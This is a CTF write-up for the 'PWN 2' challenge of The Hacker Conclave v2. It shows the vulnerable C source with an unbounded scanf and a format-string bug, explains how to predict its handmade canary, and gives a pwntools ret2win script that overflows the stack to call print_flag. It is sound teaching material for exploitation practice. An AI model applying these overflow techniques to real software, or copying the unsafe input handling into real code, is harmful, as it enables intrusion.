---
title: "PWN 2 - The Hacker Conclave v2"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["pwn", "buffer-overflow", "rop", "ret2win", "format-string", "canary", "pie", "lsb", "checksec", "sprintf", "scanf", "stack", "the-hacker-conclave", "the-hacker-conclave-v2", "ctf-writeup"]
summary: "if(!(f=fopen(\"/flag/flag.txt\",\"r\"))){"
source:
  name: "CTFtime writeup #39689"
  url: "https://ctftime.org/writeup/39689"
ctf:
  name: "The Hacker Conclave v2"
  challenge: "PWN 2"
---

## Metadata

- **CTF:** The Hacker Conclave v2
- **Task:** PWN 2
- **Author team:** Sqli Enjoyer
- **CTFtime:** <https://ctftime.org/writeup/39689>

---
# Source file 

```  
#include <stdio.h>  
#include <stdlib.h>

int mastercanary;

void print_flag(){

FILE *f;  
char flag[128];

if(!(f=fopen("/flag/flag.txt","r"))){

if(!(f=fopen("./flag.txt","r"))){  
sprintf(flag,"flag{NOT_A_FLAG}");  
}else{  
fscanf(f,"%s",flag);  
}

}else{  
fscanf(f,"%s",flag);  
}

printf("%s\n",flag);

}

void pwnme(){

int canary=mastercanary;  
char name[32];  
char surname[32];

printf("Insert your name: ");

scanf("%s",name);

printf("Welcome home ");  
printf(name);  
printf("\n");

printf("Insert your surname: ");

scanf("%s",surname);

srand(mastercanary);

if(canary != rand()){

exit(0);

}

}

void main(){

setbuf(stdout,0);

mastercanary=random();

pwnme();

}  
```

# Info of the binary

## file pwn  
> pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=595bfbc4bca867249f50e00a12c6e017f2821669, for GNU/Linux 3.2.0, not stripped

So 64 bytes and not stripped which means is going to be easy to see the funcitons address in gdb

## checksec --file=pwn  
> RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE 

>Partial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 49 Symbols No 0 2 pwn

Notice there is NO actual canary here. There is a handmadeone. 

# Expolit

## format string?

There is a format string exploit you could use here: **printf(name);** 

But in this writeup it wont be needed.

## ret2win

This is the aproach i take. 

In function pwnme. We will overwrite the return address to be the print_flag function.

The only problem to overcame is this handmade canary. So lets take a look.

### mastercanary

It is initialized like this. ** mastercanary=random();**   
Which is actually NOT random. It is pseudo random, with a seed of 1 (the default seed). So it always be the same sequence of numbers and in this case the program only takes one. So mastercanary is just one constant number. 

The only usage of this variable is to initialize canary. 

### canary

This variable is located between, the return address, we want to override, and the variable surname, which we will use to make a buffer overflow. This is a problem, because if we overwrite the return address, we will also overwrite canary.

Now the next step is analyze that weird if statment.

```  
srand(mastercanary);

if(canary != rand()){

exit(0);

}  
```

srand set ups a seed for the next rand functions. But like stated before mastercanary is constant.  
Meaning we can see this if statment is really like this: if(const1 != const2).

Our goal is to overwrite the canary to be const2.

But, what value is const2? 

Well you could see it with a debugger.

or ceating a C file and see how it works

```  
#include <stdio.h>  
#include <stdlib.h>

int main(){  
int mastercanary;  
int canary;   
  
mastercanary = random();  
printf("CONST1 = %x\n",mastercanary);

canary = mastercanary;  
srand(mastercanary);  
canary = rand();  
printf("CONST2 = %x",canary);  
  
return 0;  
}

//CONST1 = 6b8b4567  
//CONST2 = 513d25be  
```

Basically means that we need to write "513d25be" in canary. 

### Exploit script  
```  
from pwn import *

p = process("./pwn")

#elf = ELF("./pwn")  
#rop = ROP(elf)  
#print(rop.gadgets)

canario = "513d25be"  
canarioBytes = b"\xbe\x25\x3d\x51"

#0x00000000004011d6 print_flag address  
address = b"\xd6\x11\x40\x00\x00\x00\x00\x00"  
#0x401016 ret gadget  
gadget = b"\x16\x10\x40\x00\x00\x00\x00\x00"  
payload = b"a" * 76 + canarioBytes + b"aaaaaaaa" + gadget + address

p.sendlineafter(b"Insert your name:", b"lmao")  
p.sendlineafter(b"Insert your surname: ", payload)

print(p.recvline().decode())  
```

### payload explanation  
**b"a" * 76** : Is the padding needed before overwriting canary   
**canarioBytes**: This makes canary == const2   
**b"aaaaaaaa"**: Some more padding   
**gadget**: Crucial to allign the stack. This can be get with the commented section   
**address**: print_flag() address.
